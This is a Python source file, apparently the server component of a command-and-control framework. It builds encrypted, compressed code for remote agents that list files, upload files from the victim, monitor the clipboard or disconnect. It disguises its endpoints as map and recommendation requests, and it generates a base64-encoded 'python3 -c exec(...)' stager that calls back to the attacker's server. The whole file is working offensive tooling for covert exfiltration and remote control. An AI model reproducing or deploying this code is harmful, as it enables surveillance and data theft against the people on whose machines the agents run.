import base64
import config
import Logic.Agents.AgentsLogic as agentLogic
import Logic.Commands.CommandsLogic as commandLogic
from Utils.Exceptions.NotFoundException import NotFoundException
from Logic.Commands.Commands import Action
from Utils import CryptoUtils
from Utils import StringUtils
from cryptography.fernet import Fernet
import Gateways.WebSocketCybClientGateway as webSocketCybClientGateway

HTTP_PREFIX = 'http://'
FIRST_PACKET_SUFFIX = 'login'
LIST_FILES_SUFFIX = 'recommendations'
DOWNLOAD_FILES_SUFFIX = 'map'
CLIPBOARD_SUFFIX = 'countryInfo'
DEFAULT_SUFFIX = 'maps'
DISCONNECT_SUFFIX = 'personalRecommendations'


async def prepare_code_for_agent(ip_address: str):
    command = commandLogic.get_oldest_command_by_ip(ip_address)
    agent = agentLogic.get_agent_by_ip_address(ip_address)
    if command and agent:
        if command.action == Action.FILE_DOWNLOAD:
            with open('AgentCodes/UploadFile.txt', 'r') as file:
                data = file.read()
            data = data.replace('$key', agent.encryption_key)
            data = data.replace('$cookie', agent.cookie)
            data = data.replace('$file_name', command.parameters["fileName"])
            data = data.replace('$command_id', str(command.id))
            data = data.replace('$url', f'{HTTP_PREFIX}{config.server_ip}/{DOWNLOAD_FILES_SUFFIX}')

            encoded_data = CryptoUtils.encode_ascii(data)
            compressed_data = CryptoUtils.compress(encoded_data)
            return CryptoUtils.encrypt(compressed_data, agent.encryption_key)

        if command.action == Action.LIST_FILES:
            with open('AgentCodes/ListFiles.txt', 'r') as file:
                data = file.read()
            data = data.replace('$key', agent.encryption_key)
            data = data.replace('$cookie', agent.cookie)
            data = data.replace('$dir_path', command.parameters["dir_path"])
            data = data.replace('$command_id', str(command.id))
            data = data.replace('$url', f'{HTTP_PREFIX}{config.server_ip}/{LIST_FILES_SUFFIX}')

            encoded_data = CryptoUtils.encode_ascii(data)
            compressed_data = CryptoUtils.compress(encoded_data)
            return CryptoUtils.encrypt(compressed_data, agent.encryption_key)

        if command.action == Action.DISCONNECT:
            with open('AgentCodes/LastPacket.txt', 'r') as file:
                data = file.read()
            data = data.replace('$key', agent.encryption_key)
            data = data.replace('$cookie', agent.cookie)
            data = data.replace('$url', f'{HTTP_PREFIX}{config.server_ip}/{DISCONNECT_SUFFIX}')
            data = data.replace('$command_id', str(command.id))

            encoded_data = CryptoUtils.encode_ascii(data)
            compressed_data = CryptoUtils.compress(encoded_data)
            return CryptoUtils.encrypt(compressed_data, agent.encryption_key)

        if command.action == Action.CLIPBOARD_MONITOR:
            with open('AgentCodes/SendSimplePacketWithClipboard.txt', 'r') as file:
                data = file.read()
            data = data.replace('$key', agent.encryption_key)
            data = data.replace('$cookie', agent.cookie)
            data = data.replace('$url', f'{HTTP_PREFIX}{config.server_ip}/{DEFAULT_SUFFIX}')

            with open('AgentCodes/SendClipboard.txt', 'r') as file:
                send_clipboard_data = file.read()
            send_clipboard_data = send_clipboard_data.replace('$key', agent.encryption_key)
            send_clipboard_data = send_clipboard_data.replace('$cookie', agent.cookie)
            send_clipboard_data = send_clipboard_data.replace('$duration', str(command.parameters["duration"]))
            send_clipboard_data = send_clipboard_data.replace('$command_id', str(command.id))
            send_clipboard_data = send_clipboard_data.replace('$url', f'{HTTP_PREFIX}{config.server_ip}/{CLIPBOARD_SUFFIX}')

            message_bytes = send_clipboard_data.encode('ascii')
            base64_bytes = base64.b64encode(message_bytes)
            base64_data = base64_bytes.decode('ascii')

            data = data.replace('$base64_send_clipboard', base64_data)

            encoded_data = CryptoUtils.encode_ascii(data)
            compressed_data = CryptoUtils.compress(encoded_data)

            await webSocketCybClientGateway.send_message(f"Starting monitoring clipboard, scheduled in command {command.id}")

            return CryptoUtils.encrypt(compressed_data, agent.encryption_key)
    elif agent:
        with open('AgentCodes/SendSimplePacket.txt', 'r') as file:
            data = file.read()
        data = data.replace('$key', agent.encryption_key)
        data = data.replace('$cookie', agent.cookie)
        data = data.replace('$url', f'{HTTP_PREFIX}{config.server_ip}/{DEFAULT_SUFFIX}')

        encoded_data = CryptoUtils.encode_ascii(data)
        compressed_data = CryptoUtils.compress(encoded_data)
        return CryptoUtils.encrypt(compressed_data, agent.encryption_key)

    return generate_random_message()


def generate_random_message():
    data = StringUtils.generate_random_string(50)
    key = Fernet.generate_key()
    encoded_data = CryptoUtils.encode_ascii(data)
    compressed_data = CryptoUtils.compress(encoded_data)
    return CryptoUtils.encrypt(compressed_data, key.decode('UTF-8'))


def generate_first_code_for_agent(ip_address: str):
    agent = agentLogic.get_agent_by_ip_address(ip_address)
    if agent is None:
        raise NotFoundException('Agent with given ip address not found')

    with open('AgentCodes/StartingPacket.txt', 'r') as file:
        data = file.read()

    data = data.replace('$key', agent.encryption_key)
    data = data.replace('$cookie', agent.cookie)
    data = data.replace('$url', f'{HTTP_PREFIX}{config.server_ip}/{FIRST_PACKET_SUFFIX}')

    message_bytes = data.encode('ascii')
    base64_bytes = base64.b64encode(message_bytes)
    base64_data = base64_bytes.decode('ascii')

    cmd_string = f"python3 -c \"import base64; exec(base64.b64decode(\'{base64_data}\'))\""
    return cmd_string

